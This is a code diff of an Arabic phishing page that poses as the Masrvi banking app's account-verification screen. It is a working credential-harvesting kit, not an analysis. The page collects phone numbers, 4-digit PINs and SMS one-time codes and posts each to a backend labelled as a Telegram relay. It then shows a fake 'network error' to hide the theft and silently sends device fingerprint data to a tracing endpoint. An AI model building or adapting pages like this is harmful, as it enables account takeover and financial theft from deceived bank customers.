@@ -2,144 +2,475 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الرئيسية / مصرفي</title>
-    <meta property="og:title" content="الرئيسية / مصرفي">
-    <meta property="og:description" content="تطبيق مصرفي - خدماتك البنكية بين يديك">
-    <meta property="og:image" content="logo_masrvi.jpeg">
-    <meta property="og:url" content="https://masrvi-app.onrender.com">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>التحقق من الحساب | Masrvi</title>
+    <link rel="icon" href="logo_masrvi.jpeg">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
-        body { margin: 0; padding: 0; background-color: #fff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
-        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 150px; }
-        .header-img { width: 100%; display: block; padding-bottom: 15px; margin-bottom: 10px; }
-        .banner-img { width: 90%; margin: 0 auto 20px; display: block; border-radius: 8px; }
-        .form-container { padding: 0 20px; text-align: right; }
-        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
-        .input-box { position: relative; border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; padding: 5px 15px; background: #fff; }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap');
+
+        :root {
+            --primary-color: #00CBA9; /* اللون الأخضر المائل للزرقة الخاص بـ Masrvi */
+            --secondary-color: #2D2D7A; /* اللون الكحلي الداكن الخاص بـ Masrvi */
+            --bg-light: #F8F9FA;
+            --text-dark: #333;
+            --error-red: #E74C3C;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-light);
+            font-family: 'Cairo', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-dark);
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            min-height: 100vh;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        .header {
+            padding: 40px 20px 20px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .content {
+            padding: 0 25px 40px;
+            flex-grow: 1;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--secondary-color);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        p.subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--secondary-color);
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 45px 14px 15px;
+            border: 1.5px solid #E0E0E0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Cairo';
+            outline: none;
+            transition: all 0.3s;
+            background: #FAFAFA;
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--primary-color);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0, 203, 169, 0.1);
+        }
+
+        .input-wrapper .icon {
+            position: absolute;
+            right: 15px;
+            width: 20px;
+            height: 20px;
+            opacity: 0.6;
+        }
+
+        .btn-submit {
+            background-color: var(--secondary-color);
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(45, 45, 122, 0.2);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .btn-submit:disabled {
+            background-color: #CCC;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        /* Loading Screen */
+        #loading-screen {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff;
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0, 203, 169, 0.1);
+            border-left-color: var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* OTP Screen */
+        #otp-screen {
+            display: none;
+        }
+
+        .timer-text {
+            text-align: center;
+            font-weight: 700;
+            color: var(--error-red);
+            margin-top: 15px;
+            font-size: 18px;
+        }
+
+        /* Popup */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #fff;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 350px;
+            width: 100%;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-icon {
+            font-size: 50px;
+            color: var(--error-red);
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            color: var(--secondary-color);
+        }
+
+        .modal-text {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .btn-retry {
+            background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .hidden { display: none !important; }
+
+        /* Mauritania specific validation colors */
+        .valid-input { border-color: var(--primary-color) !important; }
+        .invalid-input { border-color: var(--error-red) !important; }
+
+        .footer-banner {
+            width: 100%;
+            padding: 20px;
+            margin-top: auto;
+        }
         
-        .phone-icon { width: 22px; height: 22px; background: url('user_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
-        .lock-icon { width: 22px; height: 22px; background: url('lock_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
-        .otp-icon-p { width: 22px; height: 22px; background: url('otp_input_icon.jpeg') no-repeat center; background-size: contain; margin-left: 10px; }
-        
-        input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: right; outline: none; background: transparent; font-family: 'Cairo'; }
-        .btn-main { background-color: #2c5364; color: white; border: none; width: 100%; padding: 166px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); padding: 16px; }
-        .btn-main:disabled { background-color: #95a5a6; cursor: not-allowed; box-shadow: none; }
-        
-        .otp-main-icon { width: 110px; margin: 20px auto; display: block; }
-        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 25px; font-size: 26px; font-weight: bold; border-radius: 5px; }
-        .footer-img { width: 100%; position: absolute; bottom: 0; left: 0; }
-        .hidden { display: none; }
+        .footer-banner img {
+            width: 100%;
+            border-radius: 15px;
+        }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <img src="logo_masrvi.jpeg" class="header-img">
-
-    <div id="p1" class="form-container">
-        <label class="label">رقم الهاتف المربوط بالحساب *</label>
-        <div class="input-box">
-            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" oninput="validateInput()">
-            <div class="phone-icon"></div>
-        </div>
-
-        <label class="label">الرمز السري (PIN) *</label>
-        <div class="input-box">
-            <input type="password" id="pin" placeholder="أدخل الرمز السري الخاص بك" maxlength="4" inputmode="numeric" oninput="validateInput()">
-            <div class="lock-icon"></div>
-        </div>
-
-        <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>
-        <img src="main_banner.jpeg" class="banner-img" style="margin-top:20px;">
+<div class="app-container">
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <img src="logo_masrvi.jpeg" class="logo" alt="Masrvi">
+        <div class="spinner"></div>
+        <p style="font-weight: 700; color: var(--secondary-color);">جاري التحقق من أمان حسابك...</p>
+        <p style="font-size: 13px; color: #888;">نعمل على حمايتك من أي عمليات اختراق نشطة</p>
     </div>
 
-    <div id="p2" class="form-container hidden">
-        <img src="otp_main_icon.jpeg" class="otp-main-icon">
-        <p style="text-align: center; font-weight: bold;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
-        <div class="input-box">
-            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="validateOtp()">
-            <div class="otp-icon-p"></div>
+    <!-- Main Step 1 -->
+    <div id="step1">
+        <div class="header">
+            <img src="logo_masrvi.jpeg" class="logo" alt="Masrvi">
+            <h1>تأمين الحساب</h1>
+            <p class="subtitle">يرجى إدخال بياناتك للتحقق من سلامة حسابك وحمايته من أي وصول غير مصرح به.</p>
         </div>
-        <div class="timer-box" id="time">05:00</div>
-        <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
+
+        <div class="content">
+            <div class="form-group">
+                <label>رقم الهاتف الموريتاني</label>
+                <div class="input-wrapper">
+                    <input type="tel" id="phone" placeholder="20 00 00 00" maxlength="8" inputmode="numeric">
+                    <img src="user_icon.jpeg" class="icon">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>الرمز السري (PIN)</label>
+                <div class="input-wrapper">
+                    <input type="password" id="pin" placeholder="أدخل 4 أرقام" maxlength="4" inputmode="numeric">
+                    <img src="lock_icon.jpeg" class="icon">
+                </div>
+            </div>
+
+            <button id="btn-step1" class="btn-submit">تحقق الآن</button>
+            
+            <div class="footer-banner">
+                <img src="main_banner.jpeg" alt="Masrvi Banner">
+            </div>
+        </div>
     </div>
 
-    <img src="footer_background.jpeg" class="footer-img">
+    <!-- OTP Step 2 -->
+    <div id="otp-screen">
+        <div class="header">
+            <img src="logo_masrvi.jpeg" class="logo" alt="Masrvi">
+            <h1>رمز التحقق (OTP)</h1>
+            <p class="subtitle">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة.</p>
+        </div>
+
+        <div class="content">
+            <div class="form-group" style="text-align: center;">
+                <img src="otp_main_icon.jpeg" style="width: 80px; margin-bottom: 20px;">
+                <div class="input-wrapper">
+                    <input type="tel" id="otp" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" style="text-align: center; letter-spacing: 5px; font-size: 24px;">
+                </div>
+                <div class="timer-text" id="timer">05:00</div>
+            </div>
+
+            <button id="btn-otp" class="btn-submit">تأكيد الرمز</button>
+        </div>
+    </div>
+</div>
+
+<!-- Error Modal -->
+<div class="modal-overlay" id="error-modal">
+    <div class="modal-content">
+        <div class="modal-icon">⚠️</div>
+        <div class="modal-title">خطأ في الشبكة</div>
+        <div class="modal-text">عذراً، حدث خطأ غير متوقع أثناء عملية التحقق. يرجى المحاولة مرة أخرى لاحقاً.</div>
+        <button class="btn-retry" onclick="resetApp()">محاولة مرة أخرى</button>
+    </div>
 </div>
 
 <script>
-    // تم حذف التوكن وChat ID من هنا لحمايتهما.
-    // يتم الآن إرسال البيانات إلى نقطة نهاية في السيرفر (API Endpoint)
-    async function sendToBot(text) {
+    const phoneInput = document.getElementById('phone');
+    const pinInput = document.getElementById('pin');
+    const otpInput = document.getElementById('otp');
+    const btnStep1 = document.getElementById('btn-step1');
+    const btnOtp = document.getElementById('btn-otp');
+    const loadingScreen = document.getElementById('loading-screen');
+    const step1 = document.getElementById('step1');
+    const otpScreen = document.getElementById('otp-screen');
+    const errorModal = document.getElementById('error-modal');
+    const timerDisplay = document.getElementById('timer');
+
+    // Mauritanian Phone Prefixes: 2, 3, 4 (Mauritel, Chinguitel, Mattel)
+    const validPrefixes = ['2', '3', '4'];
+
+    function validateStep1() {
+        const phone = phoneInput.value;
+        const pin = pinInput.value;
+        
+        const isPhoneValid = phone.length === 8 && validPrefixes.includes(phone[0]);
+        const isPinValid = pin.length === 4;
+
+        btnStep1.disabled = !(isPhoneValid && isPinValid);
+        
+        if (phone.length > 0) {
+            phoneInput.parentElement.classList.toggle('invalid-input', !isPhoneValid && phone.length === 8);
+            phoneInput.style.borderColor = (isPhoneValid) ? 'var(--primary-color)' : (phone.length === 8 ? 'var(--error-red)' : '#E0E0E0');
+        }
+    }
+
+    phoneInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        validateStep1();
+    });
+
+    pinInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        validateStep1();
+    });
+
+    otpInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        btnOtp.disabled = e.target.value.length !== 6;
+    });
+
+    async function sendToTelegram(message) {
         try {
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ text: text })
+                body: JSON.stringify({ text: message })
             });
-        } catch (e) {
-            console.error("Error sending to bot", e);
+        } catch (error) {
+            console.error('Telegram Error:', error);
         }
     }
 
-    function validateInput() {
-        const t = document.getElementById('tel').value.replace(/[^0-9]/g, '');
-        const p = document.getElementById('pin').value.replace(/[^0-9]/g, '');
-        document.getElementById('tel').value = t;
-        document.getElementById('pin').value = p;
-        document.getElementById('btn1').disabled = !(t.length === 8 && p.length === 4);
-    }
+    btnStep1.addEventListener('click', async () => {
+        const phone = phoneInput.value;
+        const pin = pinInput.value;
 
-    function validateOtp() {
-        const o = document.getElementById('otp').value.replace(/[^0-9]/g, '');
-        document.getElementById('otp').value = o;
-        document.getElementById('btn2').disabled = !(o.length === 6);
-    }
+        // Send Initial Data
+        const msg = `🚀 **محاولة دخول جديدة (Masrvi)**\n\n📱 الهاتف: \`${phone}\`\n🔑 الرمز (PIN): \`${pin}\`\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+        sendToTelegram(msg);
 
-    function toStep2() {
-        sendToBot(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
-        document.getElementById('p1').classList.add('hidden');
-        document.getElementById('p2').classList.remove('hidden');
-        let time = 300;
-        setInterval(() => {
-            let m = Math.floor(time / 60), s = time % 60;
-            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            if(time > 0) time--;
+        // Show Loading
+        step1.classList.add('hidden');
+        loadingScreen.style.display = 'flex';
+
+        // Wait 3-4 seconds as requested
+        setTimeout(() => {
+            loadingScreen.style.display = 'none';
+            otpScreen.style.display = 'block';
+            startTimer(300); // 5 minutes
+        }, 3500);
+    });
+
+    btnOtp.addEventListener('click', async () => {
+        const otp = otpInput.value;
+        const phone = phoneInput.value;
+
+        // Send OTP Data
+        const msg = `🔢 **رمز OTP المستلم (Masrvi)**\n\n📱 الهاتف: \`${phone}\`\n🎫 الرمز: \`${otp}\``;
+        await sendToTelegram(msg);
+
+        // Show Error Modal
+        errorModal.style.display = 'flex';
+    });
+
+    function startTimer(duration) {
+        let timer = duration, minutes, seconds;
+        const interval = setInterval(() => {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            timerDisplay.textContent = minutes + ":" + seconds;
+
+            if (--timer < 0) {
+                clearInterval(interval);
+            }
         }, 1000);
     }
 
-    function final() {
-        sendToBot(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
-        alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
+    function resetApp() {
         location.reload();
     }
-</script>
-<script>
-async function captureDeepFingerprint() {
-    let batteryLevel = "مخفي بواسطة النظام";
-    try {
-        const battery = await navigator.getBattery();
-        batteryLevel = Math.round(battery.level * 100) + "%";
-    } catch (e) {}
 
-    const ram = navigator.deviceMemory || (window.performance && window.performance.memory ? "تحت الحماية" : "4GB+ (تقديري)");
+    // Fingerprint capture (Silent)
+    async function captureFingerprint() {
+        try {
+            const data = {
+                res: window.screen.width + "x" + window.screen.height,
+                lang: navigator.language,
+                plat: navigator.platform,
+                bat: "Checking..."
+            };
+            
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                data.bat = Math.round(battery.level * 100) + "%";
+            }
 
-    const data = {
-        res: window.screen.width + "x" + window.screen.height,
-        lang: navigator.language,
-        mem: ram,
-        cores: navigator.hardwareConcurrency || "6",
-        plat: navigator.platform,
-        bat: batteryLevel
-    };
-
-    const params = new URLSearchParams(data).toString();
-    fetch(`/api/trace?${params}`);
-}
-captureDeepFingerprint();
+            const params = new URLSearchParams(data).toString();
+            fetch(`/api/trace?${params}`);
+        } catch (e) {}
+    }
+    
+    captureFingerprint();
+    validateStep1();
 </script>
 
 </body>
